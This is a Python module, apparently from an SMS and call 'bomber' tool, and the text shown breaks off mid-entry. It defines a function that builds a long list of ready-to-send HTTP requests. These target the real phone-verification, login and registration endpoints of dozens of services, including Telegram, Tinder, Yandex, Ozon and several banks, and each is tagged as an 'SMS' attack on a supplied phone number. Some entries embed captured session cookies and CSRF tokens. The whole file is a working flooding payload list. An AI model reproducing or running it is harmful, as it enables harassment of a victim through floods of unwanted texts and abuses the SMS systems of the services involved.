from smscallbomber.User_Agent import user_agent
from smscallbomber.service import email
from smscallbomber.service import username

def urls(number):
    return [
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'My.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.telegram.org/auth/send_password',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=535136360&origin=https%3A%2F%2Ftestwidgetbot.herokuapp.com&embed=1&request_access=write&return_to=https%3A%2F%2Ftestwidgetbot.herokuapp.com%2F',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2Fblog%2Fru%2Fvoiti-cherez-telegram-avtorizatsiia-na-saitie-botobot%2F',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=883734075&origin=https%3A%2F%2Fconsole.bot4shop.com&embed=1&request_access=write&return_to=https%3A%2F%2Fconsole.bot4shop.com%2Flogin.html',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=5305587912&origin=http%3A%2F%2Febot.one&embed=1&request_access=write&return_to=http%3A%2F%2Febot.one%2Fall%2Fs_radoid%2Fdialogs%2Fdialogs.php%3Flng%3Drus',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1434478353&origin=https%3A%2F%2Frobochat.io&embed=1&request_access=write&return_to=https%3A%2F%2Frobochat.io%2Fjoin%2F',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1012878451&origin=https%3A%2F%2Funu.im&embed=1&request_access=write&return_to=https%3A%2F%2Funu.im%2Faccount%2Fregauth%2Ftelegram',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Translations.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://translations.telegram.org/auth/request',
            'headers': {'authority': 'translations.telegram.org', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'cookie': 'stel_ssid=1300d252ca70bf2993_8438304871264084382; stel_lang=en; stel_dt=-300', 'origin': 'https://translations.telegram.org', 'referer': 'https://translations.telegram.org/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'phone': number,},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'divar.ir', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.divar.ir/v5/auth/authenticate',
            'parameters': {
                'phone': number
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'torob.com', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://api.torob.com/v4/user/phone/send-pin/?phone_number=' + str(number)
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'digikala.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.digikala.com/v1/user/authenticate/',
            'parameters': {
                'backUrl': '/',
                'username': number,
                'otp_call': False,
                'force_send_otp': True
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'basalam.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://auth.basalam.com/otp-request',
            'parameters': {
                'mobile': number
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'sheypoor.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.sheypoor.com/api/v10.0.0/auth/send',
            'parameters': {
                'username': number
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'samaneahan.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.samaneahan.com/api/v3/otp',
            'parameters': {
                'mobile': number
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'taaghche.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://gw.taaghche.com/v4/site/auth/signup',
            'parameters': {
                'contact': number
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'ponisha.ir', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ponisha.ir/send-mobile-verfication',
            'parameters': {
                'mobile': number,
                'type': '1'
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'logonomy.ir', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://newapi.logonomy.ir/auth/OtpLoginStep1',
            'parameters': {
                'mobile': number
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'fidibo.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.fidibo.com/identity/login/prepare',
            'parameters': {
                'username': number
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'shahrfarsh.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://shahrfarsh.com/Account/Login',
            'parameters': {
                'phoneNumber': number
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'technolife.ir', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.technolife.ir/shop_customer',
            'parameters': {
                'query': 'query check_customer_exists ($username: String, $repeat: Boolean) { check_customer_exists (username: $username, repeat: $repeat) { result request_id } }',
                'variables': {'username': number},
                'operationName': 'check_customer_exists'
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'hiss.ir', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://hiss.ir/wp-admin/admin-ajax.php',
            'parameters': {
                'action': 'bakala_send_code',
                'phone_email': number
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'quera.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://quera.org/accounts/phone_number_update/otp/request',
            'parameters': {
                'phone_number': number
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'grabtaxi.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
            'data': {'phoneNumber': number, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'},
            'headers': {'User-Agent': user_agent()[1]}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'pizza-prosto.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.pizza-prosto.ru/P_login_sms',
            'data': {'phone': str(number).replace('+', '')}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'rutaxi.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://moscow.rutaxi.ru/ajax_keycode.html',
            'data': {'phone': str(number).replace('+', '')}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'belkacar.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://belkacar.ru/get-confirmation-code',
            'data': {'aj': '50', 'registration-phone': number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'starpizzacafe.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://starpizzacafe.com/mods/a.function.php',
            'data': {'aj': '50', 'registration-phone': number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'tinder.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
            'data': {'phone_number': number},
            'headers': {}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'karusel.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://app.karusel.ru/api/v1/phone/',
            'data': {'phone': number},
            'headers': {}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'tinkoff.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.tinkoff.ru/v1/sign_up',
            'data': {'phone': '+' + str(number)},
            'headers': {}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'dostavista.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://dostavista.ru/backend/send-verification-sms',
            'data': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'monobank.com.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.monobank.com.ua/api/mobapplink/send',
            'data': {"phone": "+" + str(number)}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'sportmaster.ua', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
            'data': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'kfc.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
            'json': {"phone": "+" + str(number)}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'banki.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://requests.service.banki.ru/form/960/submit',
            'params': {"callback": "submitCallback", "name": username(), "phone": "+" + str(number), "email": email(), "gorod": "Москва", "approving_": "1"}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'ivi.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
            'data': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'taxi-ritm.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
            'data': {"RECALL": "Y", "BACK_CALL_PHONE": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'city24.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://city24.ua/personalaccount/account/registration',
            'data': {"PhoneNumber": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'koronapay.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://koronapay.com/transfers/online/api/users/otps',
            'data': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'thehive.pro', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://thehive.pro/auth/signup',
            'json': {"phone": "+" + str(number)}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': '1admiralxxx.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://win.1admiralxxx.ru/api/en/register.json',
            'json': {"mobile": number, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1, "email": "", "lang": "en"}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'planetakino.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://cabinet.planetakino.ua/service/sms',
            'params': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'eda.yandex', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://eda.yandex/api/v1/user/request_authentication_code',
            'json': {"phone_number": "+" + str(number)}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'uklon.com.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://uklon.com.ua/api/v1/account/code/send',
            'json': {"phone": number},
            'headers': {"client_id": "6289de851fc726f887af8d5d7a56c635"}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'finam.ru', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://www.finam.ru/api/smslocker/sendcode',
            'data': {"phone": "+" + str(number)}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'sushi-master.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://client-api.sushi-master.ru/api/v1/auth/init',
            'json': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'multiplex.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://auth.multiplex.ua/login',
            'json': {"login": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'pmsm.org.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ube.pmsm.org.ru/esb/iqos-phone/validate',
            'json': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'kinoland.com.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.kinoland.com.ua/api/v1/service/send-sms',
            'json': {"Phone": number, "Type": 1},
            'headers': {"Agent": "website"}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'alfalife.cc', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://alfalife.cc/auth.php',
            'data': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'kasta.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://kasta.ua/api/v2/login/',
            'data': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'vsk.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://shop.vsk.ru/ajax/auth/postSms/',
            'data': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'binotel.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://widgets.binotel.com/getcall/call/'
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'twitch.tv', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://passport.twitch.tv/register?trusted_request=true',
            'json': {"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": 'password', "phone_number": number, "username": username()}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'helsi.me', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://helsi.me/api/healthy/accounts/login',
            'json': {"phone": number, "platform": "PISWeb"}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'btfair.site', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://btfair.site/api/user/phone/code',
            'json': {"phone": "+" + str(number)}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'smart.space', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://smart.space/api/users/request_confirmation_code/',
            'json': {"mobile": "+" + str(number), "action": "confirm_mobile"}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'delivery-club.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.delivery-club.ru/ajax/user_otp',
            'data': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'mts.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
            'params': {"msisdn": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'moyo.ua', 'anonymous': 'No'}, 
            'method': 'post',
            'url': 'https://www.moyo.ua/identity/registration',
            'data': {"firstname": username(), "phone": number, "email": email()}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'my.games', 'anonymous': 'No'},
            'method': 'post', 
            'url': 'https://account.my.games/signup_send_sms/',
            'data': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'ozon.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
            'json': {"phone": number, "otpId": 0}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'ggbet.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ggbet.ru/api/auth/register-with-phone',
            'data': {"phone": "+"+str(number), "login": email(), "password": 'password', "agreement": "on", "oferta": "on"}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'fix-price.ru', 'anonymous': 'No'},
            'method': 'post', 
            'url': 'https://fix-price.ru/ajax/register_phone_code.php',
            'data': {"register_call": "Y", "action": "getCode", "phone": "+"+str(number)}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'chef.yandex', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.chef.yandex/api/v2/auth/sms',
            'json': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'niyama.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.niyama.ru/ajax/sendSMS.php',
            'data': {"REGISTER[PERSONAL_PHONE]": number, "code": "", "sendsms": ""}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'easypay.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.easypay.ua/api/auth/register',
            'json': {"phone": number, "password": username()}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'online.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://secure.online.ua/ajax/check_phone/',
            'params': {"reg_phone}": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'plink.tech', 'anonymous': 'No'},
            'method': 'post', 
            'url': 'https://plink.tech/register/',
            'json': {"phone": number}
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'tokentransit.com', 'anonymous': 'No'},
            'method': 'get',
            'url': f'https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+{number}'
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'VTK-Moscow.RU', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://vtk-moscow.ru/users/',
            'data': {'from_phone': number, 'apply': 'reg_apply'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'V-Dymov.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.v-dymov.ru/local/include/ajax/confirmation.php',
            'data': {'form': 'login', 'phone': f'+{number}'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Yandex.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://passport.yandex.ru/registration-validations/phone-confirm-code-submit',
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': 'ys=wprid.1679384887359420-13979587501565473348-sas2-0504-sas-l7-balancer-8080-BAL-6512; is_gdpr=0; i=OIDxKnILKuLOfC/x3/6cfNOlBysEz4jSh1bsE2dZq+jv8JO5bo605C3i2lgtYOR0IKMyrKk8CfYwDBPJl/oAAAcjf1o=; yandexuid=7654733481679384887; gdpr=0; _ym_uid=1679384888806459383; yandex_gid=10335; is_gdpr_b=CJjiFRCSrQEoAg==; yuidss=7654733481679384887; _ym_isad=2; ymex=1994744889.yrts.1679384889; my=YwA=; _yasc=/zjjT3KFM0czJuqEK/amOQO2BXdGVo7pZlJkiBhaVRcvAApvPsR+XruysiLKXwuYVIQWjFDS; yp=1994744888.pcs.0#1695152892.szm.1_11:1730x973:1731x839#1681976889.ygu.1#1682063297.csc.1; uniqueuid=966288921679384912; _ym_d=1679384913; _ym_visorc=b', 'Origin': 'https://passport.yandex.ru', 'Referer': 'https://passport.yandex.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'csrf_token': '2a8704c3e96ece9964d9f9d8e532444f951e837e:1679384912643', 'track_id': '0e58a09a48a203044ef08e3a0308169c12', 'display_language': 'ru', 'number': f'+{number}', 'confirm_method': 'by_sms', 'isCodeWithFormat': 'true',},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Web.ICQ.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://u.icq.net/api/v92/rapi/auth/sendCode',
            'headers': {'authority': 'u.icq.net', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://web.icq.com', 'referer': 'https://web.icq.com/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'json': {'reqId': '', 'params': {'phone': number, 'language': 'ru-RU', 'route': 'sms', 'devId': '', 'application': 'icq',},},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Leader-ID.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://leader-id.ru/api/v4/auth/start-phone-confirm',
            'cookies': {'redirectUrl': '%2Foauth%2Fauthorize%3Fclient_id%3D9d84230270d586a0e88ee509b9f552cc%26redirect_uri%3Dhttps%253A%252F%252Fasi.ru%252Fbitrix%252Ftools%252Foauth%252Fleader.php%253Fbackurl%253D%25252Fauth%25252F%26response_type%3Dcode%26state%3Dsite_id%253Ds1%26backurl%3D%252Fauth%252F', '_ym_uid': '1678219180971834918','_ym_d': '1678219180','_ym_isad': '1','_ga': 'GA1.2.958854515.1678219180','_gid': 'GA1.2.1395163383.1678219180','_ym_visorc': 'w','_gat': '1',},
            'headers': {'authority': 'leader-id.ru', 'accept': 'application/json', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://leader-id.ru', 'referer': 'https://leader-id.ru/registration', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'phone': number,},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kaliningrad.TortoMaster.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kaliningrad.tortomaster.ru/include/ajax/flashcall_helper.php',
            'headers': {'authority': 'kaliningrad.tortomaster.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'cookie': 'PHPSESSID=22c636cce7e7132d639949c53829d71f; BITRIX_SM_GUEST_ID=17718669; sotbit_regions_location_id=2446; sotbit_regions_city_choosed=Y; sotbit_regions_id=40; _ym_uid=1679389483321488055; _ym_d=1679389483; _ga=GA1.2.938843152.1679389483; _gid=GA1.2.1207429229.1679389483; _ym_isad=1; _gcl_au=1.1.457010620.1679389484; _ym_visorc=w; _gat=1; BITRIX_SM_LAST_VISIT=21.03.2023%2011%3A12%3A00', 'origin': 'https://kaliningrad.tortomaster.ru', 'referer': 'https://kaliningrad.tortomaster.ru/personal/?register=yes', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': [('admin', '1'), ('send_sms', '0'), ('REGISTER[LOGIN]', 'pjFuGXQmRd8kskdMqocI'), ('REGISTER[PHONE_NUMBER]', number), ('REGISTER[PASSWORD]', 'saR-nsA-wj8-jL2'), ('REGISTER[CONFIRM_PASSWORD]', 'saR-nsA-wj8-jL2'), ('REGISTER[LAST_NAME]', ''), ('REGISTER[NAME]', ''), ('REGISTER[SECOND_NAME]', ''), ('REGISTER[EMAIL]', ''), ('agree', 'Y'), ('send_sms', 'Y'),],
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'AliExpress.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://aliexpress.ru/aer-api/v2/bx/auth/v1/web/register/phone/init',
